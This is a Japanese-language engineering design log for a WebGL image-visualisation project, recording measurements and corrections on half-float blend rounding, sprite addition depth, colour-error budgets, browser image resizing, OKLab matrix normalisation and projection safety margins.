> 測っていない。位相を流すと生の峰は 2 桁上がる（`d = 3` で **101.0**、
> `d = 4.25` で **266.75**）。§4.20 に機構と数値を書いた。
> **以下の「1.25 倍の余裕」の議論は、余裕を掛ける相手そのものが外れている。**

#### `uKnee = 0.8` は**未計測のリテラル**だった

親（dimension）には `CompressPass` そのものが無いので、この値は「継いだ」のですらなく
**この repo で新しく置かれた数字**である。満たすべき条件は 3 つ:
アンカーの平坦部（**0.21586**）・`d = 0` の平均色（**0.2666**）がニーの下、
1.0（標本の白）はニーの上。実測の p50 が 0.216 でぴったり平坦部に一致し、
0.8 は平均色の **3.0 倍**あって条件を大きく満たしている。
→ **測って足りていたので動かさない。** 代償は書いておく:
`d = 2` で 0.8 を超える画素が **62,444 個**あり（白マーカーとランプの上端）、
アンカー窓を出たところではそれらが圧縮を受ける
（門が全開でリニア 1.0 → **厳密に 0.9**。2b は 0.906 だった。§4.21）。

#### 強度は `rotationGate` から出す —— **窓の縁で跳ねさせないため**

最初は `dimLevel` ごとの峰の表を引く設計にしていて、**アンカー窓の縁で強度が
0 から最大値へ飛ぶ**ことに気づいた（当時 4.42、2c-i 以降は 5）。
上のとおり `d = 2` には 0.8 超の画素が 6 万個あるので、
それは**窓を出た瞬間に白がストンと落ちる**という見え方になる。
§2.1 の門を `smoothstep`（C¹）で作ったのと同じ問題で、答えも同じでよい:

```
strength(d) = rotationGate(d) · s_max
```

窓の中では `rotationGate` が**厳密に 0** を返すので、圧縮の恒等性は
「測ったら峰が 1.0 以下だった」という偶然ではなく**構造**である。
**動き始めること・写真が雲へ解けること・圧縮が入ることが、同じ 1 つの門から出る。**
この形は 2c-i でも変えていない ── 変えたのは `s_max` の決め方だけである。

**2b の `s_max`（Phase 2c-i で捨てた）**: `s_max = (V − 1)/((1 − k)(V − k))` に
実測の包絡 2.0176 の **1.25 倍** `V = 2.5220` を入れて **4.4193**。
理由文は「位相は無限に流れ続けるので、8 点の掃引で見た最大を上限とは呼べない」だった。
**この理由文は偽である**（位相は閉軌道で、周期 2000π ≈ 6283 秒。§4.20）。
そして 25% という数字自体にも根拠が無かった。→ §4.21 で決め方ごと差し替えた。

ラダーの G15 が画素で裏を取る ── アンカーで **0 / 3,074,656 バイト相違**、
門が開くと相違あり、HDR の峰が配線なし **1.469** → 配線あり **0.954**（2b は 0.969）。
**ただし G15 は位相 0 でしか測っていない**（見出しにそう明記したのは 2c-i）。
位相を流したときは **G16** が見る（§4.20）。

### 4.6 half-float 飽和 —— 実測（水準 A・**Phase 1b で全面的に書き直した**）

初版はここに 3 つの誤りを置いていた。**3 つとも Phase 1b の設計を歪めるものだった**ので、
経緯ごと残す（`src/image/halfFloat.ts` が実装と実測の置き場）。

#### 訂正 1 —— 「天井は 0.03125 = 2⁻⁵」は **δ ≈ 1.5e−5 における 1 標本**

`Float16Array` で δ を固定して停止値を測ると、**天井は δ に比例して動く**:

| δ | 実測停止値 | `2048·δ` | 直上の 2 冪 |
|---|---|---|---|
| 9.537e−7 | 0.001953125 | 0.0019531 | ✅ |
| 1.526e−5 | **0.03125** | 0.03125 | ✅ |
| **1.530e−5** | **0.0625** | 0.0313344 | ✅ |
| 1.000e−3 | 4 | 2.048 | ✅ |
| 1.000e+0 | 2048 | 2048 | ✅ |

**正しい法則は「天井 = `2048·δ` 以上の最小の 2 冪」**（15/15 で一致）。
仮数 10 bit ゆえ `ulp(A) = A·2⁻¹⁰` で、`A + δ` は `δ = ulp(A)/2` で丸め戻る
── つまり `A = 2048·δ`。「停止点は n に依らない」は真のまま。
δ を 1.526e−5 から **1.530e−5 へ 0.3% 動かすだけで天井が 2 倍に跳ぶ**ので、
「0.03125」を定数として持つと必ず外す。

#### 訂正 2 —— 「約 3% 暗く出る」は法則ではない。**符号が定まらない**

目標 0.21586（sRGB 128）を n 個に割って足した実測:

| n | 合計 | 誤差 |
|---|---|---|
| 256 | 0.218262 | **+1.11%** |
| 378 | 0.219849 | **+1.85%** |
| 489 | 0.222168 | **+2.92%** |
| 512 | 0.205200 | **−4.94%** |
| 2048 | 0.234985 | **+8.86%** |
| 3537 | 0.125000 | **−42.09%**（天井で停止） |
| 89,208 | 0.007813 | **−96.38%** |

符号も大きさも δ と ulp の 2 進的な関係で決まり、**単調でも常に undershoot でもない**。
`n ∈ [2, 4096]` のうち誤差 1% 超が 3763/4095 件。
**「暗くなる側」だけで予算を組むと overshoot 側で外す。**

#### 訂正 3 —— **`n = 489` は取り違えだった**

489 は ULTRA 格子の `cols`（489×326）であって、列平均バッファの点数でも、
どの dimLevel の加算深度でもない。**加算深度は「点数」ではなく
「1 フラグメントを覆うスプライトの個数」である**（完全に重なったときだけ一致する）。
**モデル**（`spriteGain.ts` の `modelledAdditionDepth`。Phase 2c-v で名前ごと直した ──
下の表は関数の出力であって測定ではない。§0.1 規律 4）:

| 構成 | 加算深度（モデル） |
|---|---|
| 2 次元格子（`dimLevel = 2`・出荷中の雲経路） | **16** |
| 列平均線（`dimLevel = 1`） | **4** |
| ~~完全な潰し（`dimLevel = 0`・列平均バッファ 378 点）~~ | ~~378~~ **Phase 2a 以降 到達不能**（深度 1） |
| 完全な潰し（**格子のまま** 89,208 点） | **89,208** → **−96.4%** |
| **`dimLevel → 1⁺`（線に潰れた格子）** | **`4 × rows`** ＝ HIGH **944** / BALANCED 628 / ULTRA 1260 |

最後の行が Phase 2c-v で見つかったもので、**`n ≤ 512` を破っている**（§4.6.1）。

最後の行が Phase 1b の設計を決めている ── **格子のまま `dimLevel = 0` へ潰すと、
加算が天井で止まって 96% 消える。列平均バッファが要る理由は
「丸め誤差 3%」ではなく、これである**（§7.7）。

#### 予算（ΔE00 換算・グレー軸で実測）

| 加算深度の上限 | 最悪 ΔE00 |
|---|---|
| 256 | 0.622 |
| **512** | **1.364** |
| 1024 | 2.506 |
| 2048 | **4.376** ← 予算 3.0 を超える |

→ **加算深度を 512 以下に抑えることが構造的な要件**であり、
`LINE_MAX_POINTS = 512`（`image/columnLine.ts`）はここから来ている。

#### 訂正 4 —— **この予算表は「加算項がすべて等しい」場合にしか使えない**（Phase 2a で実測）

上の表は目標値を `n` 等分して足した実測、つまり **`n` 個の項がすべて同じ**場合である。
実際の `dimLevel = 0` は**列ごとに違う色**を足すので、条件が違う。
同一幾何（1024×640・S = 8.654・深度 378）で、位相の寄与を除いた残差:

| 入力 | 残差 |
|---|---|
| 一様グレー（項がすべて等しい） | **≈ 0%** |
| 標本 No.0 | **−5.2%** |
| 左 199 / 右 30 の二値 | **−6.0%** |
| 左 30 / 右 199（**同じ画素集合の鏡像**） | −4.5% |

**左右を反転しただけで 1 コード動く** ── つまり**加算の順序に依存する**。
暗い列の 1 点あたりの寄与は **3.0e−5** で、half-float の最小正規数 **6.104e−5** を下回り、
明るい列を積んだあとのアキュムレータに対しては小さすぎて丸め戻される。

→ **深度の上限だけでは守れない。** `LINE_MAX_POINTS = 512` は
「較正域を外れさせない」（§4.18）ぶんは今も正しいが、**忠実性の根拠としては不十分**である。
Phase 2a は潰れた軸を CPU 側で先に畳むことで、`dimLevel = 0` の深度を **378 → 1** にした
（§2.3 / §7.7）。~~**大きさを予測するモデルはまだ無い（水準 C）**~~ → 次項。

#### 訂正 5 —— **丸めモードを取り違えていた。ブレンドは 0 方向へ切り捨てる**（Phase 2b・水準 A）

監査の fp16 逐次丸めシミュレーションは「1% 未満」を出し、実測は「−5.2% / −6.0%」だった。
**どちらかが雑だったのではない。** 仮説を 3 つ立て、それらを分ける値の並びを設計し、
**作品を通さずに** GPU のブレンドユニットへ直接積む器具（`blendProbe`）を作って投票させた。

| ケース | 実測 | f32 厳密 | fp16 最近接 | fp16+非正規数切り捨て | **fp16 RTZ** |
|---|---|---|---|---|---|
| `1 + 0.5 + 0.25`（自己検査） | 1.75 | 1.75 | 1.75 | 1.75 | 1.75 |
| `1` に `2⁻¹²` を 4 回 | **1.0** | 1.0009766 | 1.0 | 1.0 | 1.0 |
| `3.0e−5` を 1024 回 | **0.021759033** | 0.030719848 | 0.031188965 | **0** | 0.021759033 |
| 等しい項 378 個 | **0.244628906** | 0.266649395 | 0.274169922 | 0.274169922 | 0.244628906 |
| 二値（明→暗） | **0.292968750** | 0.307249308 | 0.296386719 | 0.296386719 | 0.292968750 |
| 二値（暗→明・**鏡像**） | **0.298828125** | 0.307249844 | 0.302246094 | 0.296386719 | 0.298828125 |

**立てた 3 つの仮説はすべて反証され、答えは 4 つ目だった。**
6 ケースすべてで **fp16 ＋ 0 方向への切り捨て**が厳密に一致する（`Object.is`）。

- `1 + 2⁻¹² × 4` が **1.0** なので、アキュムレータが f32 だという仮説は落ちる
- `3.0e−5 × 1024` が **0 でない**ので、非正規数ソースは潰されていない
- **最近接丸めは不偏**なので誤差が打ち消し合い、シミュレーションは 1% 未満を出した。
  **切り捨ては片側にしか外れない** ── 深度に比例して系統的に暗くなる。
  実測が「常に undershoot で、深度と項の大きさに比例する」形だったのは、これである。

**これは仮説として持ち込んだものではない。** 3 つとも外れ、しかも実測が常に予測より
小さかったので、「片側にしか外れない ＝ 丸めモード」を疑って足した。
器具が無ければ、3 つのうち一番近いものを選んで終わっていた ── だから `classifyBlend` は
**「いちばん近いモデル」を返さない**（0 個も返す）。

#### 予算表を作り直した

上の予算表は `Float16Array`（最近接）で計算されていた。実機の丸めモードで引き直すと:

| 深度 n | 最近接の誤差（旧） | **切り捨ての誤差（実機）** | **ΔE00（実機）** | 旧 ΔE00 |
|---|---|---|---|---|
| 16 | +0.151% | **−0.188%** | **0.042** | — |
| 64 | +0.490% | **−1.150%** | **0.260** | — |
| 128 | +0.886% | **−3.185%** | **0.726** | 0.324 |
| 256 | +1.112% | **−7.427%** | **1.731** | 0.622 |
| 378 | +1.848% | **−7.709%** | **1.799** | — |
| **512** | −4.939% | **−10.311%** | **2.439** | **1.364** |
| 1024 | +1.961% | **−21.847%** | **5.476** | 2.506 |
| 2048 | +8.860% | **−42.092%** | **11.418** | 4.376 |

**`LINE_MAX_POINTS = 512` はいまも予算 3.0 の内側だが、余裕は 1.364 ではなく 2.439** ──
信じていたより **1.8 倍**きわどかった。そして Phase 2a が潰れた軸を先に畳んで
`dimLevel = 0` の深度を 378 → 1 にした判断は、この表で**より強く正当化される**
（1.799 が 0.004 になる）。

#### 分けられなかった区別（隠さない）

「アキュムレータだけを切り捨てる」と「ソースも切り捨ててから足す」は、
**この 6 ケースでは 1 ビットも違わない**。区別する入力を作れなかったので、区別できていない。
作品への帰結が同じなので追わないが、「分けた」とは書かない。

#### `d ≥ 3` にこの機構は残っているか（Phase 2b・G12）

格子経路は 1 フラグメントに **16** 個のスプライトが重なる（**モデル** `modelledAdditionDepth`。
GPU に数えさせた実測は `d = 2` で最大 13.5・`d ≥ 2.25` で **38〜45** ── §4.6.1）。
上の表では深度 16 の誤差は **−0.188%** で、`d = 2` の錨が ΔE00 0.042 の内側にいることと
整合する。ラダーの **G12** は、幾何を固定して色場だけを差し替え
（`image` / `mean` / `image+mean`）、積分光量が `I(A+B) = I(A) + I(B)` を満たすかを見る ──
**幾何のモデルを 1 つも要求しない**構成である。実測 **0.0141% / 0.0138% / 0.0130%**
（`d = 3 / 4 / 5`・予算 **0.2%**。2b 時点は 0.0211% / 0.0202% / 0.0184% で、
**同じ機体・同じ標本のままコード状態だけで 1.5 倍動いた** ── 床は機体定数ではない）。
予算の根拠と、その予算に初めて付いた歯は §4.6.1。

**この行が見ないもの（書いておく）**: 一様な**乗法的**な欠損は重ね合わせに現れない。
切り捨てはほぼ乗法的なのでここはほぼ 0 を出す。捕まえられるのは**非線形**な機構
── 飽和・非正規数の潰れ・クリップであり、それらこそ §4.6 が `d = 0` で恐れたものである。

### 4.6.1 深度の前提を正直にした（Phase 2c-v）—— モデルを実測と呼び、掃引が帯を跨いでいた

独立監査 3 体を並列で立て、待つあいだに自分で GPU を測った。**3 件とも監査が物理に到達した。**

#### 訂正 1 —— `additionDepth` は**モデル**である（名前ごと直した）

doc コメントは「**実測**: 格子で 16、列平均線で 4、完全な潰しで点数そのもの（378）」と
書いていたが、**その 3 つの数はこの関数自身の出力**である（§0.1 規律 4 が名指しで禁じている形）。
しかも 378 は Phase 2a が `d = 0` を深度 1 に畳んだ時点で**到達不能**になっており、化石化していた。

→ `additionDepth` → **`modelledAdditionDepth`**。`stats()` のフィールドも DEV の HUD も追随させた。

GPU に数えさせて突き合わせた（フラグメントシェーダの最終行だけを `vec4(1.0)` に差し替え、
加算合成が (SrcAlpha, One) なので HDR RT の画素値＝重なり枚数として読む。fp16 の整数は
2048 まで厳密。差し替えたシェーダがちょうど 1 本であることを毎回確認する）:

| dimLevel | モデル | 実測 平均 | 実測 **最大** | モデル/実測最大 |
|---|---|---|---|---|
| **`d → 1⁺`** | **944** | 748.6 | **944.00** | **1.00（厳密に一致）** |
| 1.05 | 308 | 164.9 | 241.5 | 1.28 |
| 1.5 | 32 | 21.1 | 25.0 | 1.28 |
| **2**（アンカー） | 16 | 10.7 | 13.5 | **1.19（過大）** |
| **2.5 / 3 / 5** | 16 | 10.7 / 10.3 / 10.0 | **38 / 37.5 / 45.25** | **0.35〜0.43（過小）** |

**誤差の向きは `dimLevel` で変わる。`dimLevel` を言わずに「過小」と書くと偽になる**
（2c-iv の要約で一度そう書いて外した）。過小になるのは z が散って `gl_PointSize` が
点ごとに変わり、**正則格子という前提そのものが死ぬ**帯だけである。

この値は**観測専用**である ── 監査が `vi.mock` で `() => 1` に差し替えて確認した:
`sampleWeight` / `gain` / `s0` / `spritePx` / `cameraDistance` / `fill` / 投影後座標のハッシュ /
点群と線の全 uniform は **1 ビットも動かない**。

#### 訂正 2 —— `n ≤ 512` は**破れている**。緑だったのは掃引の粗さのおかげ

深度は閉形式である（`spritePx = K_SPRITE·s0` と `dx = extentX·s0` で
**カメラ距離が約分されて消える**ので、距離にもホールドにも依らず node で完全に再現できる）:

```
depth = min(cols, ⌊K_SPRITE/extentX⌋+1) × min(rows, ⌊K_SPRITE/extentY⌋+1)
```

`extentY → 0⁺` で `ny` が `rows` に張り付くので、**到達しうる最大は `4 × rows`**
（`⌊3.85⌋+1 = 4` はティア不変）── HIGH **944** / BALANCED **628** / ULTRA **1260**。
**3 ティアとも 512 を超える。**

G10 の掃引は `d += 0.25` の 21 点で、**その帯を 1 点も採らない**（実測でも 64 しか見ていなかった）。
`d = 1` は列平均バッファで深度 4、`d = 1+ε` で格子に切り替わって 944 へ**不連続に跳ぶ**。

**刻みを細かくするのは直し方として誤りである**（§0.1 規律 9「窓は機構から導く」）。
→ **折れ点（`extentY = K_SPRITE/m`、`m = 1…rows`）を列挙する。** 実測 703 点で最大は
`d = 1.0163135` の 944、閉形式と一致。

##### **訂正 —— 「0.01 刻みでも踏み損ねる」は偽だった**（Phase 2c-vii で実測）

2c-v はここに「帯の幅は ULTRA で **0.01222** しかないので 0.01 刻みでも踏み損ねる」と
書いた。**実シーン経路（`LensScene.stats().modelledAdditionDepth`）で 3 ティアを掃くと**:

| 刻み | BALANCED | HIGH | ULTRA |
|---|---|---|---|
| 0.25（2c-v まで） | 64 | 64 | 64 |
| 0.05 / 0.02 / **0.01** / 0.005 | **628** | **944** | **1260** |
| **0.015625（2 冪・16 倍）** | 628 | 944 | **984（踏み損ね）** |

**`0.01` は踏む。踏み損ねるのは 2 冪の `0.015625` のほうである。**
踏む／踏まないを決めているのは刻みの細かさではなく **`d += h` の丸め方向**だった ──
2 冪の刻みは `d` をちょうど `1.0`（列平均バッファ・深度 4）に落として外し、
`0.01` は `1.0000000000000002` に落として格子側へ入る。

→ **結論（折れ点を列挙せよ）は変わらないが、理由が違った。**
「刻みを N 倍にする」という操作は、この帯に対しては**再現性のない乱数装置**である。
独立監査 2 体が別々にこれを指摘し、私が実シーンで確かめた。

**`scripts/ladder.mjs:904` の同じ注記はまだ直していない**（コードなので次フェーズ）。

##### **`n ≤ 512` の破れは標本のアスペクトが決める**（Phase 2c-vii で実測）

`rows` は格子の行数なので、**横長の画像ほど小さくなる**。`4 × rows` が 512 を超えるかは
アスペクトの関数であって、ティアの関数ではない:

| 標本 | 寸法 | BALANCED | HIGH | ULTRA |
|---|---|---|---|---|
| No.0 / gray / mono / 色相スイープ | 〜1024×640 | 628 | 944 | 1260 |
| **横長** | 1024×64 | **196** | **296** | **400** |
| **1 行画像** | 1024×1 | **24** | **36** | **48** |

→ **上の「3 ティアとも 512 超」は標本 No.0 のアスペクトについての主張である。**
`src/tests/specimen.test.ts` が台帳 6 枚でこれを固定した。

**そして `scripts/ladder.mjs` の `G10_RECORDED` は `rows` を鍵にした表なので、
別の標本を通すと `expected === undefined` → `record(…, null)` ＝ 採点しない**
（赤くならずに消える）。2c-vii では直していない ── ラダーは GPU ゲートである。

#### この帯で何が壊れるか

§4.6 の ΔE00 表（切り捨て・実機）は深度 512 で **2.439**、1024 で **5.476**（予算 3.0）。
944 はその間にある。GPU で測った model-free の量（G12 の重ね合わせのずれ）も同じ帯で跳ぶ:

| d | 深度 | ずれ（重ね合わせ） | 生の峰 |
|---|---|---|---|
| **1.001** | 944 | **−0.5621%** | 0.2883 |
| **1.01** | 944 | **−0.2055%** | 0.4028 |
| 1.05 | 308 | 0.0642% | 0.8018 |
| 2 | 16 | 0.0248% | 1.0400 |
| 3 / 4 / 5 | 16 | 0.0141 / 0.0138 / 0.0130% | 1.39 / 1.50 / 1.63 |

`d = 1.001` は**現行の 0.5% すら超えていた**。監査が実機の丸めモデルで積んだ ΔE00 は
`d ∈ (1, 1.016]` で **mean 1.0〜2.3 / max 4.7**、描かれた画素の **12〜23%** が予算 3.0 を超える
（node のシミュレーションなので**水準 B**。GPU の読み戻しではない）。

#### 直さずに記録した —— そして期限を書く

- 予算を上げる → §0.1 規律 7（緩い方へ外す）。**採らない**
- 「0.25 刻みの 21 点」へ主張を狭める → §7.9.2（見ていないものを合格に見せる）。**採らない**
- **未修正のまま、値を固定して記録する** ── 2c-iii がティアの `dpr`/`samples` 未配線を
  そう扱ったのと同じ形。行は予算ではなく**記録値との一致**を見るので、直っても悪化しても赤くなる

**出荷経路からは到達不能である。** `setDimLevel` の呼び出し元は `main.ts` の 1 か所だけで、
それは `installDevHook` に渡すオブジェクトの中にあり、`installDevHook` は
`if (!import.meta.env.DEV) return;` で出荷ビルドから消える。`src/ui/` にスライダは無い。
**いま壊れているのは測定器から見える絵だけである。**

→ 直し方は **Phase 2a が線経路でやったことの格子 y 軸版**（潰れた軸を CPU 側で先に畳む。
`effectiveLineCount` に対応するものが格子には無く、`lensScene` は `!grid` のときしか畳まない）。
**期限は Phase 3 が連続なつまみを付ける前。** つまみが付いた瞬間、`1 → 2` を動かすたびに必ずこの帯を通る。

なお **0.25 刻みへのスナップで隠すのは誤り**である ── 掃引の刻みに依存した緑になるうえ、
`1.00 → 1.25` の段差（深度 64・ずれ 0.0661%）は残る。

#### 訂正 3 —— G12 の予算 0.5% の導出は算術が誤っていた。そして 0.2% にした

1 段あたりの相対欠損の上限は RTZ なので **`2⁻¹⁰`**（`2⁻¹¹` は**最近接**の unit roundoff。
実測の 1 段最悪 0.0974% は `2⁻¹¹` = 0.0488% を超える）。項が非負なら部分和は単調なので
`E ≤ n·ulp(T)`、`Δ = E(A) + E(B) − E(A+B)` の 3 項は同符号（≥ 0）だから「差はその 2 倍」も成り立たない:

```
|Δ| / T(A+B) ≤ n · ulp(T)/T ≤ n · 2⁻¹⁰        （深度 16 で 1.5625%。3.1% ではない）
```

**上限に `2⁻¹¹` を使ったのと 2 倍を二重に掛けたのと、誤りが 2 つあって打ち消し合っていた**
（どちらの読み方でも 1.5625% になる ── 算術としては偶然）。
採点している `dev` の分母は `T` ではなく `I(A+B) = S(A+B)` なので、
実際の上界は `n·2⁻¹⁰ / (1 − n·2⁻¹⁰)`（深度 16 で 1.5873%）である。

**そして 0.2% は機構からは導けない。** 1.5625% は敵対的に揃った場合の値で、`blendModel` で
構成すると深度 16 で実際に **1.44%（上界の 93%）** に届く ── 上界が緩いのではなく、
そこに置くと**何も落とせない**。0.2% は**今日の床の 3.8 倍に引いた経験的な柵**であり、
コメントにもそう書いた（§0.1 規律 4）。床はコード状態だけで 1.5 倍、標本だけで 4 倍動いている。

「切り捨てはほぼ乗法的なのでここはほぼ 0 を出す」も訂正した ── 厳密に言えるのは
**`B = A` なら `Δ = 0`**（RTZ が 2 冪倍と可換で `S(2a) = 2S(a)`）だけで、
**`B = 2A` では既に成り立たない**（実測 2.39%）。
実測の「一様グレー 0.0000%」はまさにこの退化で、**機構について何も言っていない**。

#### 訂正 4 —— **この予算には歯が無かった**

既存の故障 `colorfield` は `I(A+B)` を `I(A)` に取り違えるので `dev ≈ −100%` を出す ──
**0.5% でも 0.2% でも同じように赤い。** つまり**この数字を 0% から 100% までどこへ動かしても
全テストが緑のまま**だった（§0.1 規律 7 が名指しで警告している形）。

そして `scripts/teeth.mjs` の台帳は **`src/` しか書き換えない**ので、
**予算リテラルが `scripts/` に在るかぎり、あちらでは構造的に歯を作れない。**

→ ラダーの `FAULTS` に **`g12budget`**（重ね合わせを 0.3% だけ壊す）を足した。
0.3% は 0.2%（新）と 0.5%（旧）の間なので、**予算を戻した瞬間に素通りする**。
主張は実際に確かめた ── 予算を 0.5% へ戻して走らせると `❌ 期待 G12 → 落ちた行（無し）`。
代償は隠さない: **これは機構ではなく数字そのものを試す歯である。**

---

### 4.7 取り込み時の縮小はガンマ空間平均 —— 実測（水準 A / Chrome 148）

黒 1px と白 1px の 2×1 を 1×1 へ縮小して読み戻した:

| 経路 | 結果 |
|---|---|
| `drawImage(src, 0,0,1,1)`（`imageSmoothingQuality: 'high'`） | **128** |
| `createImageBitmap(blob, {resizeWidth:1, resizeHeight:1, resizeQuality:'high'})` | **128** |
| 期待値: ガンマ空間平均 | 128 |
| 期待値: リニア光平均 | 188 |

**リニア光ではリサンプルされない。** 50/50 の黒白領域は真のリニア平均 0.5（`#BCBCBC`）に対し
`#808080` として返る —— リニア光で 2.3 倍の誤差。

→ 最初の縮小（長辺 2048px 上限）だけブラウザに任せ、**それ以降の縮約は全部リニア光で自分でやる**。
`columnMeans` / `globalMean` は**正準リニアバッファから**計算する（グリッドからではない）。
2048px 時点の残差は近傍が強く相関しているため小さいが、ゼロではない。

**Phase 1a-ii で bitmap→bitmap 経路と `resizeQuality` の 3 段でも再確認した** ──
`'high'` / `'medium'` / `'low'` のどれでも黒白 2px→1px は **128**。品質設定を上げても
リニア光にはならない。だから縮小は 1 回で終わらせる、という結論は変わらない。

#### 訂正 1 —— 「未知メンバの黙殺」は Safari 固有ではない（Phase 1a-ii で実測）

初版は「Safari は未知のディクショナリメンバを黙って無視する」と書いていた。
**帰属が不正確である。** Chrome 148 でも `createImageBitmap(src, { lensNoSuchMember: 1 })` は
素通りする ── これは WebIDL のディクショナリ全般の挙動であって、特定の実装の欠陥ではない。
Safari で問題になったのは `resizeWidth` を**実装していなかった**からで、
そのとき初めてそれが「未知のメンバ」になった。

結論（`bitmap.width` を要求値と比較せよ）は正しいまま。ただし**検出手段が 2 段ある**ことが
分かったので、両方を測る（§4.13）。

#### 訂正 2 —— 「最初の縮小だけブラウザに任せる」は 1 回では成立しない（Phase 1a-ii で実測）

`createImageBitmap(blob, { resizeWidth: 2048, ... })` の 1 回では書けない。三重に壊れる:

1. **`resizeWidth` は EXIF 適用後の幅に効く。** 8×2 に Orientation=6 を付けたもの
   （向き適用後 2×8）に `{resizeWidth:4}` を渡すと **4×16** が返る。縦長画像では
   高さが上限を超えたまま通り、**「長辺 ≤ 2048」は片側指定では表現できない**。
   両方指定するとアスペクト比が壊れる（明示指定が勝つ: `{4,1}` → 4×1）。
2. **無条件に渡すと小さい画像を拡大する。** 64×32 の **772 バイト**の JPEG が
   **2048×1024** になり、正準バッファが **24 MB**（元画像の 3 万倍）になる。例外は出ない。
3. **`resizeQuality` の既定は `'low'`。** 明示しないと縮小品質が黙って落ちる。

コスト（24MP JPEG 6000×4000 → 2048×1365、3 回の中央値）:

| | ms |
|---|---|
| フルデコードのみ | 227.9 |
| `resizeQuality` **省略（＝既定の `'low'`）** | 294.5 |
| `'medium'` | 602.3 |
| `'high'` | 600.7 |

→ **2 段デコードにする。** 1 段目（`createImageBitmap(blob)`）で向きの適用された寸法を
確定させ、それを `planResize()` に渡し、2 段目（`createImageBitmap(bitmap, {...})`）で縮小する。
1 段目の出力がそのまま正しい寸法なので、**EXIF パーサは 1 バイトも要らない**。
`resizeQuality: 'high'` は明示する（錨のために取り込みで 1 回だけ払う）。

`planResize` は純関数として `src/ingest/plan.ts` にあり、
「**拡大しない**」を node で落とせるテストにしてある。

### 4.8 透視カスケードの真の不変条件

よくある誤解は「‖x‖ ≤ 1 に正規化してあるから安全」。これが保証するのは**第1段だけ**である。
各段は座標を `f = dist/(dist−p[d])` 倍に増幅するので、第2段の入力ノルムは 1 ではなく
`dist/(dist−1)` になり、段ごとに累積する。

正しい不変条件は「どの段でも `|p[d]| < dist`」。実測（`rotationN.test.ts`）では
n=5・dist=2.4 で max(|p[d]|/dist) < 0.75、`F_CLAMP` は不発火。

**Phase 4（n ≤ 10）では破綻する**: `r₁ = 1.714 → r₂ = 5.997 > 2.4`。同テストが
n=7・dist=1.5 でこれを再現している（`maxRatio > 1`）。そのときは dimension の
`polytopeExhibit.ts` にある auto-dist ループを純関数として持ち込むこと ——
`F_CLAMP` があるので破れても NaN にはならず、**無音で壊れる**。

---

### 4.9 `dist = 2.4` では足りない —— 実画像は単位球を出る（Phase 1a-i で実測）

§4.8 の「n=5・dist=2.4 で全段安全、max ratio < 0.75」は **単位球内の点で測った値**である。
実際に持ち上げた画像はそこに収まらない ── `sC` は p95 なので、**上位 5% の画素は
`a', b'` が 1 を超える**。標本 No.0 の実測 `maxNorm = 1.5074`。

n=5 の必要条件は代数的に確定する。段 d の増幅は `f = dist/(dist − p[d])` なので、
入力ノルム r に対し出力は `r·dist/(dist − r)`。第 2 段の入力が dist を割るには

```
r · dist/(dist − r) < dist   ⟺   dist > 2r
```

標本では **dist > 3.015** が必要で、2.4 では足りない。`F_CLAMP` があるので
**破れても NaN にならず無音で壊れる** ── §4.8 が警告していたとおりの経路である。

→ `lift()` が `maxNorm` を返し、`safeDist(maxNorm)`（`math/rotationN.ts`）が
`max(2.4, 2.2·maxNorm)` を返す。標本では 3.316。

**Phase 1a-ii で配線し、Phase 1a-iii が実際に使っている（C → A）。**
`lensScene` が `cascadeDist` として `liftProject5` へ渡す（起動実測 **3.3838**）。 初版の本節は「Phase 1a-iii は必ずこれを呼ぶこと」と
書いていたが、**「必ず呼ぶこと」は仕組みではない** ── 呼び忘れても `F_CLAMP` があるので
NaN にはならず、無音で壊れる。だから呼び忘れようのない位置へ移した:
`ingest/session.ts` が `lift` を呼んだ**その場で** `safeDist(maxNorm)` を計算して応答に載せる。
dist を決める側が `maxNorm` を持っていない、という状態を作らない。

**`maxNorm` は格子に依存する**ことも分かった。標本 No.0 は
`fitGrid(…, 4000)` で 1.5074、起動時の BALANCED 格子（251×157）で **1.5339**
── 細かい格子ほどセル平均の平滑化が弱く、外れ値が残る。
だから `safeDist` は**取り込み時に 1 回**ではなく、**格子を引き直すたびに**計算する
（`relift` も同じ関数を通る）。

### 4.10 スプライト定数 —— 設計が 45 倍外していた（Phase 1a-i で実測）

点群は `w(r) = exp(−F·r²)`、`r² > 0.25` で `discard`。`kSprite` はセル間隔に対する直径比。

設計当初の **F=6, kSprite=1.7 は平坦場リップル 44.7%** だった（主張は「≤1%」）。
原因は幾何で、光る半径 `kSprite/2 = 0.85` セルが**軸方向の隣接点（1.0 セル）に届かず**、
隣接スプライトが `discard` で丸ごと消える。格子点の上では自分 1 個、セル中心では 4 個が
寄与し、被覆数が 1→2→4 と振れる。設計は「単独のスプライトが柔らかいか」で定数を選び、
主張の対象である**格子和を一度も評価していなかった**。

| F | kSprite | リップル | fill |
|---|---|---|---|
| 6 | 1.7 | **44.7%** | 2.89 |
| 17（親の線用） | 1.7 | 149.8% | 2.89 |
| 20 | 3.7 | 1.07% | 13.7 |
| **21** | **3.85** | **0.69%** | **14.8** |

**採用: F = 21, kSprite = 3.85。** 代償は隠さない ── fill が **5.1 倍**、
オーバードローは常時 `π/4·kSprite² ≈ **11.6 × フレームバッファ**`
（ULTRA・4.1 Mpx で 48 Mfrag/frame = 60fps で 2.9 Gfrag/s）。
**Phase 2c のフィルレート測定の対象**であり、GPU 経路の要否判断（§4.4）を動かしうる。

構造的な禁止として `kSprite/2 > 1.0`（光る半径が隣接点に届く）をテストで固定した。

### 4.11 OKLab 行列 —— 公表係数とは一致しない（Phase 1a-i で実測）

設計は「導出した sRGB→LMS 行列が Ottosson の公表係数と 1e-9 で一致することが、
原色パラメータ化の全正当化である」としていた。**偽である。**

M1 に標準的な sRGB→XYZ 行列を掛けても一致しない ──
IEC 丸め **3.0e-4** / Lindbloom **1.5e-4** / 規格4桁 **2.9e-4**。
Ottosson は丸めた行列を公表しているので、合成では再現できない。

代わりに**定義が要求する性質へ戻す**: `toLMS` の各行を、白が LMS (1,1,1) へ写るよう正規化する
（von Kries 型の白色順応と同じ形）。OKLab の構成自体が「白 → L=1, a=b=0」を要求しており、
公表行列の丸めがそれを壊しているだけなので、これは辻褄合わせではない。

| | 正規化前 | 正規化後 |
|---|---|---|
| 白の a | −1.0e-5 | **−1.7e-16** |
| グレー画素の彩度 | ~1e-5 | < 2e-5（退化しきい値 0.002 の 1/100） |

テストは「一致」ではなく **「実測した上界 2e-4」** と **「白が両原色で中性であること」** を主張する。
採用行列は Lindbloom の D65 リファレンス（公表係数に最も近い）。

**なお sRGB 規格そのものが折れ点で連続していない。** 12.92 と (0.055, 1.055, 2.4) は
独立に丸められているので、0.0031308 の両側に **2.85e-8** の段差が残る。
